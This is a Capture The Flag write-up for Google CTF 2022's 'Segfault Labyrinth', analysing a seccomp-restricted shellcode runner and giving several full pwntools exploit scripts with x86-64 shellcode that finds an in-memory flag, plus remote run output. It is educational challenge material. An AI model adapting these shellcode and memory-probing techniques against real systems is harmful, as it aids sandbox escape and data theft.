# Google Capture The Flag 2022

## SEGFAULT LABYRINTH

> Be careful! One wrong turn and the whole thing comes crashing down
> 
> `segfault-labyrinth.2022.ctfcompetition.com 1337`

[`challenge`](challenge)

Tags: _rev_ _pwn_ _shellcode_ _x86-64_ _seccomp_


## Summary

Basic seccomp constrained shellcode runner where the flag is randomly located [in RAM] and you've got to find it.

> UPDATE: See end for alternatives.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Given this is a shellcode runner challenge, RWX segments are not unexpected.  However, none of this is relevant.


### seccomp dump

```bash
# seccomp-tools dump ./challenge

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000004  if (A != stat) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x06 0x00 0x00 0x00000000  return KILL
```

Not dissimilar to many basic shellcode challenges where, `open`, `read`, `write` are used to exfiltrate the flag, however there is no `open`.  Fortunately the flag is in RAM; we'll only need `write`.


### Decompile in Ghidra

```c
      pFVar2 = fopen("/dev/urandom","r");
      if (pFVar2 == (FILE *)0x0) {
        fwrite("Error: failed to open urandom. Exiting\n",1,0x27,stderr);
        local_114 = -1;
      }
      else {
        uVar7 = 10;
        pvVar3 = mmap((void *)0x0,0x1000,3,0x22,-1,0);
        __ptr = pvVar3;
        do {
          sVar4 = fread(&local_f8,1,1,pFVar2);
          uVar9 = (ulong)((byte)local_f8 & 0xf);
          local_f8 = local_f8 & 0xffffffffffffff00 | (ulong)(byte)((byte)local_f8 & 0xf);
          if (sVar4 != 1) {
            fwrite("Error: failed to read random. Exiting.\n",1,0x27,stderr);
LAB_00101525:
            fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
            return -1;
          }
          uVar8 = 0;
          do {
            iVar1 = rand();
            pvVar5 = mmap((void *)((long)iVar1 * 0x1000 + 0x10000),0x1000,(uint)(uVar9 == uVar8) * 3,0x22,-1,0);
            *(void **)((long)__ptr + uVar8 * 8) = pvVar5;
            if (pvVar5 == (void *)0x0) {
              fwrite("Error: failed to allocate memory.\n",1,0x22,stderr);
              goto LAB_00101525;
            }
            uVar8 = uVar8 + 1;
            uVar9 = local_f8 & 0xff;
          } while (uVar8 != 0x10);
          __ptr = *(void **)((long)__ptr + uVar9 * 8);
          if (__ptr == (void *)0x0) goto LAB_00101525;
          uVar7 = uVar7 - 1;
        } while (uVar7 != 0);
```

In `main` there are two [nested] loops.  The outer loop of 10 assigns [per iteration] `local_f8` a 4-bit (range 0-15) value from `urandom`.  The inner loop of 16 creates [per iteration] a pseudo random address and `mmap`s a page of memory to that location; if the loop index matches the 4-bit value from `urandom`, then that allocation will be set with `rw-` permissions.

After both loops end the last `rw-` allocation is used to store the flag:

```c
        pFVar2 = fopen("flag.txt","r");
        if (pFVar2 == (FILE *)0x0) {
          fwrite("Error: failed to open flag. Exiting.\n",1,0x25,stderr);
          local_114 = -1;
        }
        else {
          sVar4 = fread(__ptr,1,0x1000,pFVar2);
```

One of the last 16 locations will contain the flag, so there is no need to concern ourselves with the previous 9*16 addresses; this reduces any searching to only 16 locations.

`rand()` is used with no seed (defaults to 1), making each location deterministic.

To exploit this we'll use `write` to _write_ out each location.  Any attempt to read memory with pure shellcode will segfault with 15/16 odds since the permissions for 15 of the 16 are `---`.  However, `write`, will return `EFAULT` (`-14`) into `rax`, and then continue on.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *
from ctypes import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process(binary.path)
```

Standard pwntools header.

```python
glibc = cdll.LoadLibrary('libc.so.6')
for i in range(9*16): glibc.rand()

sc = f'''
mov rdi, 1
mov rdx, 100
'''

for i in range(16):
    sc += f'''
    mov rsi, {hex(glibc.rand() * 0x1000 + 0x10000)}
    mov eax, {constants.SYS_write}
    syscall
    cmp rax, 100
    je end
    '''

sc += f'''
end:
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
'''
```

The section above creates our shellcode.  Repeated calls to `glibc.rand()` simulates the 9*16 `rand()` calls that are not relevant.

For the remaining 16 locations we'll call `write` and check that `write` returns `100` (the number of bytes we requested be written with `mov rdx, 100`).

If that check passes, then we have the flag, so we'll jump to the `end:`, and `exit` gracefully.

> A number of these type of challenges will produce no output if you do not exit cleanly, and it's worse with higher latency connections.  If `exit` is not an option then `hlt` or `jmp $` usually do the trick.


```python
shellcode = asm(sc)
if args.D: print(disasm(shellcode))
assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
```

Send/run shellcode; get the flag.

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
[*] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
```

## Alternative Solves

### Alternative `exploit2.py`

Same as described above, however with locations table appended to payload vs. hardcoded and unrolled.  Payload is about 1/3 the size of the payload above.

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process(binary.path)

shellcode = asm(f'''
mov rdi, 1
mov rdx, 100
mov rbx, 16
loop:
dec rbx
lea rsi, [rip + locations]
mov rsi, qword ptr [rsi + rbx*8]
mov eax, {constants.SYS_write}
syscall
cmp rax, 100
je end
// test rbx, rbx
jne loop
end:
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
locations:
''')

if args.D: print(disasm(shellcode))

from ctypes import *
glibc = cdll.LoadLibrary('libc.so.6')
for i in range(9*16): glibc.rand()
for i in range(16): shellcode += p64(glibc.rand() * 0x1000 + 0x10000)

assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
```

### Intended Solution `exploit3.py`

The intended solution, as stated by the challenge author on Discord, is to leverage the only register (`rdi`) that is not reset [before shellcode execution] to navigate the labyrinth with `stat`.

> I assumed all registers were reset when I created my initial solve; checking the last 16 allocations seemed easy enough.

The nested loops in the challenge binary creates 10 arrays, each with 16 elements, one of which is a pointer (randomly selected) to the next array.  `rdi` points the first array; the last array has a pointer to the in-memory flag:

```
array: 0         1         2         3     .........     a
-----------------------------------------------------------------------
rdi -> 0    .--> 0    .--> 0    .--> 0               --> 0
       1    |    1    |    1    |    1                   1
       2    |    2    |    2    |    2                   2 ---> CTF{...
       3    |    3    |    3    |    3                   3
       4 ---'    4    |    4    |    4                   4
       5         5    |    5    |    5                   5
       6         6    |    6    |    6                   6
       7         7    |    7    |    7     .........     7
       8         8    |    8    |    8                   8
       9         9    |    9 ---'    9                   9
       a         a    |    a         a                   a
       b         b    |    b         b ---               b
       c         c    |    c         c                   c
       d         d ---'    d         d                   d
       e         e         e         e                   e
       f         f         f         f                   f
```

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process(binary.path)

shellcode = asm(f'''
mov r15, rdi
mov r14, 10
loop1:
    dec r14
    lea rdi, [rip + filename]
    mov r13, 16
    loop2:
        dec r13
        mov rsi, qword ptr [r15 + r13*8]
        // need to skip over the 16 pointers for our stat buf
        add rsi, 16*8
        mov eax, {constants.SYS_stat}
        syscall
        test rax, rax
        jne loop2
    test r14, r14
    je end
    mov r15, qword ptr [r15 + r13*8]
    jmp loop1
end:
mov rdi, 1
mov rsi, qword ptr [r15 + r13*8]
mov rdx, 100
mov eax, {constants.SYS_write}
syscall
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
filename:
''')

if args.D: print(disasm(shellcode))
shellcode += b'flag.txt'
assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
```

### Intended Solution Alternative (no `stat`) `exploit3.1.py`

Same as above, but only using `write` and dealing with all the garbage:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process(binary.path)

shellcode = asm(f'''
mov r15, rdi
mov rdi, 1
mov rdx, 100
mov r14, 10
loop1:
    dec r14
    mov r13, 16
    loop2:
        dec r13
        mov rsi, qword ptr [r15 + r13*8]
        mov eax, {constants.SYS_write}
        syscall
        cmp rax, 100
        jne loop2
    test r14, r14
    je end
    mov r15, qword ptr [r15 + r13*8]
    jmp loop1
end:
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
''')

if args.D: print(disasm(shellcode))
assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvall()[900:] # garbage collection
_ = _[:_.find(b'\0')].decode().strip() # extract flag from garbage
p.close()
print(_)
```

If `write` were the only option, or if the memory were `r--` (`stat` would fail to write), then this or my original solve is your best bet, however ...

### Leak Stack Alternative (portable and consistent) `exploit4.py`

Get stack leak from `fs:0x300`, then use the offset to the flag pointer; use GDB/GEF to figure it out:

```
gef➤  p/x $fs_base+0x300
$1 = 0x7f09746e7840
gef➤  p/x {long}$1
$2 = 0x7ffef1759330
gef➤  grep CTF{
[+] Searching 'CTF{' in memory
[+] In (0x613efdd5000-0x613efdd6000), permission=rw-
  0x613efdd5000 - 0x613efdd500b  →   "CTF{flag}\n"
gef➤  vmmap stack
Start              End                Offset             Perm Path
0x00007ffef173a000 0x00007ffef175b000 0x0000000000000000 rwx [stack]
gef➤  find 0x00007ffef173a000, 0x00007ffef175b000-1, 0x613efdd5000
0x7ffef1759040
0x7ffef1759048
0x7ffef17591c8
3 patterns found.
gef➤  p/x {long}$1 - 0x7ffef1759040
$2 = 0x2f0
```

#### `exploit4.py`:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
    p = process(binary.path)

shellcode = asm(f'''
mov rsi, qword ptr fs:0x300
mov rsi, qword ptr [rsi - 0x2f0]
mov dl, 100
mov al, {constants.SYS_write}
mov rdi, rax
syscall
mov al, {constants.SYS_exit}
syscall
''')

if args.D:
    print(disasm(shellcode))
    log.info('len(shellcode) = {x}'.format(x = len(shellcode)))

assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
```

> `rax` and `rdx` were reset before shellcode run; use `dl` and `al` to reduce payload.

29 bytes:

```bash
# ./exploit4.py D=1 REMOTE=1
[+] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
   0:   64 48 8b 34 25 00 03    mov    rsi, QWORD PTR fs:0x300
   7:   00 00
   9:   48 8b b6 10 fd ff ff    mov    rsi, QWORD PTR [rsi-0x2f0]
  10:   b2 64                   mov    dl, 0x64
  12:   b0 01                   mov    al, 0x1
  14:   48 89 c7                mov    rdi, rax
  17:   0f 05                   syscall
  19:   b0 3c                   mov    al, 0x3c
  1b:   0f 05                   syscall
[*] len(shellcode) = 29
[*] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
```
